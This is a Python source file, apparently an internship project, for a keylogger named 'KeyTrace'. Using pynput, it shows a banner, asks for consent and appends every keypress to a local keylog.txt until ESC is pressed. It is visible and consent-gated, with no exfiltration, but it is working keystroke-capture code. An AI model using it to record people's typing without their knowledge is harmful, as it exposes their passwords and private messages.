'''
Task 3 - Prodigy Infotech

Ethical Keylogger - KeyTrace

Developed as part of my internship at Prodigy Infotech, this project is an ethical keystroke logger designed for authorized security testing and research purposes. 
It records keystrokes in real time, ensuring responsible use with explicit user consent.

This project enhanced my understanding of Python’s `pynput` library, file handling, and ethical hacking principles. 
It also strengthened my awareness of security best practices and the responsible development of monitoring tools.

 Disclaimer: This tool is strictly for educational and ethical use only. Unauthorized use is illegal and unethical.

'''


from pynput.keyboard import Listener

#================ Main Program ========================

banner = """ \033[32m
██╗  ██╗███████╗██╗   ██╗    ████████╗██████╗  █████╗  ██████╗███████╗
██║ ██╔╝██╔════╝╚██╗ ██╔╝    ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝
█████╔╝ █████╗   ╚████╔╝        ██║   ██████╔╝███████║██║     █████╗  
██╔═██╗ ██╔══╝    ╚██╔╝         ██║   ██╔══██╗██╔══██║██║     ██╔══╝  
██║  ██╗███████╗   ██║          ██║   ██║  ██║██║  ██║╚██████╗███████╗
╚═╝  ╚═╝╚══════╝   ╚═╝          ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝
\033[0m
    \033[35m~~~~~  Developed by Aspiring Penster Mr. Izaz   ~~~~~ \033[0m 
    \033[38;5;220m~~~~~  Follow Here: GitHub.com/mizazhaider-ceh  ~~~~~\033[0m
\033[94m~~~~~ Internship Task/Project Assigned by ProDigy Infotech ~~~~~\033[0m
"""
print(banner)
print("\033[38;5;220m=" * 60 ,"\033[0m")
print("~\033[32mThis program logs keystrokes for testing purposes ONLY\033[0m")
print("~\033[31m      You MUST have permission to run this\033[0m")
print("\033[38;5;220m=" * 60 ,"\033[0m")

consent = input("\033[33m\n~Do you agree to use this ethically? (Y/N):\033[0m ").strip().lower()
if consent != "y":
    print("\033[31mPermission denied. Exiting program...\033[0m")
    exit()

print("\033[36m~Keylogger started. Press keys... (Press ESC to stop)\033[0m")


log_file = "keylog.txt"

#========================== Function =========================================
# Function to handle key presses
def press_key(key):
    key = str(key).replace("'", "")  # cleaning the key
    if key == "Key.space":
        key = " "  # Adding a space instead of 'Key.space'
    elif key in ["Key.shift", "Key.shift_r", "Key.ctrl", "Key.ctrl_l", "Key.ctrl_r", "Key.alt", "Key.alt_l", "Key.alt_r"]:
        return  # Ignore shift, ctrl, and alt keys
    elif key == "Key.enter":
        key = "\n"  # New line when ENTER is pressed
    elif key == "Key.backspace":
        key = "[BACKSPACE]"  # Show [BACKSPACE] instead of deleting characters
    


    with open(log_file, "a") as file:
        file.write(key + " ")  # Append key to log file
        
    if key == "Key.esc": 
        print("\n[INFO] Stopping Keylogger...") # Stoping the listener when ESC Key is pressed
        return False  # This stops the listener
    
#============================= Listener ================================    
# Start listening for key presses
with Listener(on_press=press_key) as listener:
    listener.join()




